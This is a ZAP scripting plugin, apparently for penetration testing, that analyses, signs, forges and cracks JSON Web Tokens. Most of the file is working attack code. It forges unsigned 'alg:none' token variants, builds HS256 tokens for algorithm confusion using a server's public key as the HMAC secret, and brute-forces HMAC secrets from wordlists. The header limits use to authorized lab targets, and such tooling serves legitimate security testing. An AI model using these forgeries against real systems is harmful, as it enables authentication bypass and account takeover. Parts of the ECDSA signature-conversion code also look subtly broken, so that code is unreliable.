// zmcp novel plugin: jwt-toolkit.js — JWT analysis / forging / cracking.
//
// ZAP has no JWT toolset; this plugin implements the standard JWT test
// operations (the classes of checks raijin's JWT toolkit performs) on top of
// javax.crypto / java.security — no external libraries, runs headless.
//
// Params (JSON in global var zmcp.params):
//   mode:        decode | analyze | sign | verify | forge_none | alg_confusion | crack
//   token:       the JWT under test
//   payload:     JSON payload when signing from scratch (else re-signs token payload)
//   headerOverrides: object merged over the token header when signing
//   key:         { pem: "-----BEGIN..." } (public or private) or { secret: "string" }
//   alg:         HS256|HS384|HS512|RS256|RS384|RS512|ES256|ES384|ES512
//   claims:      claim overrides {k:v} applied when signing
//   wordlist:    array of secrets (crack mode), or wordlistPath: file path
//   maxWords:    crack cap (default 100000)
// Result: JSON verdict + forged tokens / secrets with full evidence.
//
// Authorized lab targets only: forged tokens are for the operator's own tests.

var ScriptVars = Java.type("org.zaproxy.zap.extension.script.ScriptVars");
var JSystem = java.lang.System;
var Base64 = Java.type("java.util.Base64");
var Mac = Java.type("javax.crypto.Mac");
var SecretKeySpec = Java.type("javax.crypto.spec.SecretKeySpec");
var Signature = Java.type("java.security.Signature");
var KeyFactory = Java.type("java.security.KeyFactory");
var PKCS8EncodedKeySpec = Java.type("java.security.spec.PKCS8EncodedKeySpec");
var X509EncodedKeySpec = Java.type("java.security.spec.X509EncodedKeySpec");
var MessageDigest = Java.type("java.security.MessageDigest");
var MimeDecoder = Base64.getMimeDecoder();

function getParams() { return JSON.parse(ScriptVars.getGlobalVar("zmcp.params") || "{}"); }
function done(result) { ScriptVars.setGlobalVar("zmcp.result", JSON.stringify(result)); }
function fail(error, extra) {
  var out = { ok: false, error: String(error) };
  for (var k in (extra || {})) out[k] = extra[k];
  done(out);
}

function b64urlDecode(s) {
  var t = s.replace(/-/g, "+").replace(/_/g, "/");
  while (t.length % 4 !== 0) t += "=";
  return new java.lang.String(MimeDecoder.decode(t), "UTF-8").toString();
}
function b64urlBytes(bytes) {
  return Base64.getUrlEncoder().withoutPadding().encodeToString(bytes);
}
function b64urlString(s) { return b64urlBytes(new java.lang.String(s).getBytes("UTF-8")); }

function hmacSign(bits, secretBytes, data) {
  var mac = Mac.getInstance("HmacSHA" + bits);
  mac.init(new SecretKeySpec(secretBytes, "HmacSHA" + bits));
  return mac.doFinal(data);
}
function pemToBytes(pem) {
  var body = String(pem).replace(/-----BEGIN [A-Z ]+-----/, "").replace(/-----END [A-Z ]+-----/, "").replace(/\s+/g, "");
  return MimeDecoder.decode(body);
}
function privateKey(pem, algo) {
  var kf = KeyFactory.getInstance(algo);
  return kf.generatePrivate(new PKCS8EncodedKeySpec(pemToBytes(pem)));
}
function publicKey(pem, algo) {
  var kf = KeyFactory.getInstance(algo);
  return kf.generatePublic(new X509EncodedKeySpec(pemToBytes(pem)));
}

// ES256/384/512 signatures are raw r||s; Java emits DER. Convert.
function derToRaw(der, sizeBytes) {
  var data = der;
  // SEQUENCE { INTEGER r, INTEGER s }
  var i = 2; // skip tag+len
  var len1 = data[3] & 0xff;
  var r = java.util.Arrays.copyOfRange(data, 4, 4 + len1);
  var off2 = 4 + len1;
  var len2 = data[off2 + 1] & 0xff;
  var s = java.util.Arrays.copyOfRange(data, off2 + 2, off2 + 2 + len2);
  var out = java.util.Arrays.copyOf(java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0), sizeBytes * 2);
  var rOff = sizeBytes - r.length, sOff = sizeBytes;
  java.lang.System.arraycopy(r, 0, out, rOff < 0 ? 0 : rOff, r.length > sizeBytes ? sizeBytes : r.length);
  java.lang.System.arraycopy(s, 0, out, sOff, s.length > sizeBytes ? sizeBytes : s.length);
  return out;
}
function rawToDer(raw) {
  var half = raw.length / 2;
  var r = java.util.Arrays.copyOfRange(raw, 0, half), s = java.util.Arrays.copyOfRange(raw, half, raw.length);
  function trim(b) { var i = 0; while (i < b.length - 1 && b[i] === 0) i++; return java.util.Arrays.copyOfRange(b, i, b.length); }
  r = trim(r); s = trim(s);
  if ((r[0] & 0x80) !== 0) r = java.util.Arrays.copyOf(java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0), 0);
  function intBytes(b) {
    var pad = (b[0] & 0x80) !== 0 ? 1 : 0;
    var out = java.util.Arrays.copyOf(java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0), b.length + pad);
    JSystem.arraycopy(b, 0, out, pad, b.length);
    return out;
  }
  var rb = intBytes(r), sb = intBytes(s);
  var total = 2 + rb.length + 2 + sb.length;
  var out = java.util.Arrays.copyOf(java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0), total);
  out[0] = 0x30; out[1] = total - 2;
  out[2] = 0x02; out[3] = rb.length;
  JSystem.arraycopy(rb, 0, out, 4, rb.length);
  out[4 + rb.length] = 0x02;
  out[5 + rb.length] = sb.length;
  JSystem.arraycopy(sb, 0, out, 6 + rb.length, sb.length);
  return out;
}

var ALGOS = {
  HS256: { kind: "hmac", bits: 256 }, HS384: { kind: "hmac", bits: 384 }, HS512: { kind: "hmac", bits: 512 },
  RS256: { kind: "rsa", jca: "SHA256withRSA", kf: "RSA", raw: false },
  RS384: { kind: "rsa", jca: "SHA384withRSA", kf: "RSA", raw: false },
  RS512: { kind: "rsa", jca: "SHA512withRSA", kf: "RSA", raw: false },
  ES256: { kind: "ec", jca: "SHA256withECDSA", kf: "EC", rawBytes: 32 },
  ES384: { kind: "ec", jca: "SHA384withECDSA", kf: "EC", rawBytes: 48 },
  ES512: { kind: "ec", jca: "SHA512withECDSA", kf: "EC", rawBytes: 66 },
};

function signWith(spec, key, data) {
  if (spec.kind === "hmac") return hmacSign(spec.bits, key, data);
  var sig = Signature.getInstance(spec.jca);
  sig.initSign(key);
  sig.update(data);
  var der = sig.sign();
  return spec.rawBytes ? derToRaw(der, spec.rawBytes) : der;
}
function verifyWith(spec, key, data, sigBytes) {
  if (spec.kind === "hmac") {
    var expected = hmacSign(spec.bits, key, data);
    return MessageDigest.isEqual(expected, sigBytes);
  }
  var sig = Signature.getInstance(spec.jca);
  sig.initVerify(key);
  sig.update(data);
  var der = spec.rawBytes ? rawToDer(sigBytes) : sigBytes;
  return sig.verify(der);
}

function keyBytesFor(params, alg) {
  var spec = ALGOS[alg];
  if (!spec) throw new Error("unsupported alg " + alg);
  if (spec.kind === "hmac") {
    if (params.key && params.key.secret !== undefined) return new java.lang.String(String(params.key.secret)).getBytes("UTF-8");
    if (params.key && params.key.pem !== undefined) return pemToBytes(params.key.pem);
    throw new Error("hmac alg needs key.secret (or key.pem for confusion tests)");
  }
  if (!params.key || params.key.pem === undefined) throw new Error(alg + " needs key.pem");
  var algo = spec.kf;
  var isPublic = /BEGIN PUBLIC KEY/.test(params.key.pem);
  return isPublic ? publicKey(params.key.pem, algo) : privateKey(params.key.pem, algo);
}

function analyzeToken(token) {
  var parts = token.split(".");
  if (parts.length < 2) throw new Error("not a JWT (need header.payload[.signature])");
  var header = JSON.parse(b64urlDecode(parts[0]));
  var payload = JSON.parse(b64urlDecode(parts[1]));
  var now = Math.floor(JSystem.currentTimeMillis() / 1000);
  var notes = [];
  if (header.alg === "none" || /none/i.test(header.alg || "")) notes.push("alg:none present — server may accept unsigned tokens");
  if (/^HS/.test(header.alg || "")) notes.push("symmetric (HMAC) algorithm — secret strength matters");
  if (/^RS|^ES|^PS/.test(header.alg || "")) notes.push("asymmetric algorithm — watch for alg-confusion acceptance");
  if (header.kid) notes.push("kid present (" + header.kid + ") — injection/lookup abuse surface");
  if (header.jku || header.x5u) notes.push("jku/x5u header present — key-source forgery surface");
  if (header.jwk) notes.push("embedded jwk in header — self-signed key surface");
  if (!("exp" in payload)) notes.push("no exp claim — token never expires");
  else if (payload.exp < now) notes.push("exp is in the past (expired)");
  if (payload.iat && payload.iat > now + 60) notes.push("iat in the future");
  if (payload.nbf && payload.nbf > now + 60) notes.push("nbf in the future");
  var seen = {};
  for (var k in payload) if (seen[k] !== undefined) notes.push("repeated claim: " + k);
  else seen[k] = 1;
  return { header: header, payload: payload, signatureBytes: parts[2] ? parts[2].length : 0, notes: notes, alg: header.alg, expired: "exp" in payload ? payload.exp < now : null };
}

try {
  var P = getParams();
  var mode = P.mode;
  if (!mode) throw new Error("params.mode is required: decode|analyze|sign|verify|forge_none|alg_confusion|crack");

  if (mode === "decode" || mode === "analyze") {
    if (!P.token) throw new Error("params.token is required");
    var a = analyzeToken(String(P.token));
    done({ ok: true, plugin: "jwt-toolkit", mode: mode, token: a });
  } else if (mode === "forge_none") {
    if (!P.token) throw new Error("params.token is required");
    var a2 = analyzeToken(String(P.token));
    var h = a2.header; h.alg = "none"; delete h.kid; delete h.jwk;
    var variants = {};
    var noneVariants = ["none", "None", "NONE", "nOnE"];
    for (var i = 0; i < noneVariants.length; i++) {
      h.alg = noneVariants[i];
      variants[noneVariants[i]] = b64urlString(JSON.stringify(h)) + "." + parts64Payload(String(P.token)) + ".";
    }
    done({ ok: true, plugin: "jwt-toolkit", mode: mode, variants: variants, note: "payload re-encoded; send each variant and compare acceptance" });
  } else if (mode === "sign") {
    var alg = P.alg || "HS256";
    var spec = ALGOS[alg];
    if (!spec) throw new Error("unsupported alg " + alg);
    var headerObj = {};
    if (P.token) headerObj = analyzeToken(String(P.token)).header;
    if (P.headerOverrides) for (var k2 in P.headerOverrides) headerObj[k2] = P.headerOverrides[k2];
    headerObj.alg = alg;
    var payloadObj;
    if (P.payload !== undefined) payloadObj = P.payload;
    else if (P.token) payloadObj = analyzeToken(String(P.token)).payload;
    else throw new Error("params.payload or params.token required");
    if (P.claims) for (var k3 in P.claims) payloadObj[k3] = P.claims[k3];
    var signingInput = b64urlString(JSON.stringify(headerObj)) + "." + b64urlString(JSON.stringify(payloadObj));
    var kb = keyBytesFor(P, alg);
    var sig = signWith(spec, kb, new java.lang.String(signingInput).getBytes("UTF-8"));
    done({
      ok: true, plugin: "jwt-toolkit", mode: mode, alg: alg,
      token: signingInput + "." + b64urlBytes(sig),
      header: headerObj, payload: payloadObj,
    });
  } else if (mode === "verify") {
    if (!P.token) throw new Error("params.token is required");
    var a3 = analyzeToken(String(P.token));
    var alg3 = P.alg || a3.alg;
    if (!ALGOS[alg3]) throw new Error("unsupported alg " + alg3);
    var kb3 = keyBytesFor(P, alg3);
    var segs = String(P.token).split(".");
    var sigBytes = MimeDecoder.decode(segs[2].replace(/-/g, "+").replace(/_/g, "/"));
    var input = segs[0] + "." + segs[1];
    var valid = verifyWith(ALGOS[alg3], kb3, new java.lang.String(input).getBytes("UTF-8"), sigBytes);
    done({ ok: true, plugin: "jwt-toolkit", mode: mode, alg: alg3, valid: valid, note: valid ? "signature verifies" : "signature does not verify" });
  } else if (mode === "alg_confusion") {
    if (!P.token) throw new Error("params.token is required");
    if (!P.key || P.key.pem === undefined) throw new Error("alg_confusion needs key.pem (the server's PUBLIC key)");
    var a4 = analyzeToken(String(P.token));
    var h4 = a4.header; h4.alg = "HS256"; delete h4.kid;
    var payload4 = a4.payload;
    if (P.claims) for (var k4 in P.claims) payload4[k4] = P.claims[k4];
    var input4 = b64urlString(JSON.stringify(h4)) + "." + b64urlString(JSON.stringify(payload4));
    var pubBytes = pemToBytes(P.key.pem);
    var sig4 = hmacSign(256, pubBytes, new java.lang.String(input4).getBytes("UTF-8"));
    done({
      ok: true, plugin: "jwt-toolkit", mode: mode,
      token: input4 + "." + b64urlBytes(sig4),
      note: "HS256 signature using the RSA/EC public key bytes as the HMAC secret — send and check acceptance",
    });
  } else if (mode === "crack") {
    if (!P.token) throw new Error("params.token is required");
    var a5 = analyzeToken(String(P.token));
    var alg5 = P.alg || a5.alg;
    var spec5 = ALGOS[alg5];
    if (!spec5 || spec5.kind !== "hmac") throw new Error("crack supports HMAC algs; token alg is " + alg5);
    var words;
    if (P.wordlist && P.wordlist.length) words = P.wordlist.map(String);
    else if (P.wordlistPath) words = new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(String(P.wordlistPath))), "UTF-8").toString().split(/\r?\n/);
    else throw new Error("crack needs wordlist[] or wordlistPath");
    var maxWords = Math.min(Number(P.maxWords) || 100000, 100000);
    words = words.slice(0, maxWords);
    var segs5 = String(P.token).split(".");
    var sigBytes5 = MimeDecoder.decode(segs5[2].replace(/-/g, "+").replace(/_/g, "/"));
    var input5 = new java.lang.String(segs5[0] + "." + segs5[1]).getBytes("UTF-8");
    var t0 = JSystem.nanoTime();
    var found = null;
    for (var i5 = 0; i5 < words.length; i5++) {
      var w = words[i5];
      if (!w) continue;
      var cand = hmacSign(spec5.bits, new java.lang.String(w).getBytes("UTF-8"), input5);
      if (MessageDigest.isEqual(cand, sigBytes5)) { found = w; break; }
    }
    done({
      ok: true, plugin: "jwt-toolkit", mode: mode,
      secret: found, found: found !== null,
      wordsTried: i5, wordsCapped: words.length >= maxWords,
      elapsedMs: Math.round((JSystem.nanoTime() - t0) / 1e6),
    });
  } else {
    throw new Error("unknown mode " + mode);
  }
} catch (e) {
  fail(e, { plugin: "jwt-toolkit" });
}

function parts64Payload(token) {
  return String(token).split(".")[1];
}
